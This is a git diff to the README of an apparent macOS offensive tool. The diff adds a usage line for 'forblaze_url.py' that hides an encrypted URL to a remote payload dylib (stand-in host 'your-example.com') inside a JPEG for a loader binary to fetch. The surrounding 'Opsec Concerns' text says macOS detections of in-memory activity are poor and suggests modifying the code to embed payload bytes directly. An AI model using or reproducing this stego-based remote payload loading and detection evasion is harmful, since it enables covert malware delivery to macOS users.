@@ -49,6 +49,10 @@ optional arguments:
 
   -key_url KEY_URL      Provide the URL to the key to decrypt the stego file.
 
+```
+  python3 forblaze_url.py -innocent_path Land-of-Belle.jpeg -o my_evil_pic.jpeg -len_key 24 -url_to_encrypt "https://your-example.com/test-payload.dylib" -method 1 -stego_location /tmp/my_not_evil_pic.jpeg  -compiled_binary innocent_binary
+```
+
 ## Opsec Concerns
 Honestly, not too many.  Mac OS detections are still pretty poor, especially for in-memory activity.  As an exercise for the reader, you could also call payload bytes directly vs a URL with some slight modifications to this code.  However, depending on the size of your payload, the encryption piece in the python script might take an unacceptably long time to complete.  
 
